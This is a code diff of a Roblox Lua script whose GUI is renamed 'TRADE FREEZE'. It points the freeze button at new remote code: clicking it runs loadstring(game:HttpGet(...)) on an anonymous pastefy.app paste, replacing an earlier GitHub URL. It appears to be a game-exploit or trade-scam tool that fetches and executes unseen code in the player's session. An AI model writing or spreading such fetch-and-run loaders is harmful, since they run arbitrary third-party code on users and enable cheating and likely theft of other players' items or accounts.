@@ -45,7 +45,7 @@ end
 
 -- GUI Elements
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "GlazeHub"
+screenGui.Name = "TRADE FREEZE"
 screenGui.ResetOnSpawn = false
 screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
@@ -171,9 +171,8 @@ freezeBtn.MouseButton1Click:Connect(function()
         Duration = 3
     })
 
-    -- Load external script
     local success, result = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/dentizyy1-hash/freezetradegag/main/FREEZER.txt"))()
+        loadstring(game:HttpGet("https://pastefy.app/mUjFhYyx/raw"))()
     end)
 
     if not success then
@@ -204,3 +203,4 @@ tweenObject(searchBox, {TextTransparency = 0}, 0.6)
 tweenObject(avatar, {ImageTransparency = 0.2}, 0.6)
 tweenObject(freezeBtn, {TextTransparency = 0}, 0.6)
 tweenObject(forceBtn, {TextTransparency = 0}, 0.6)
+
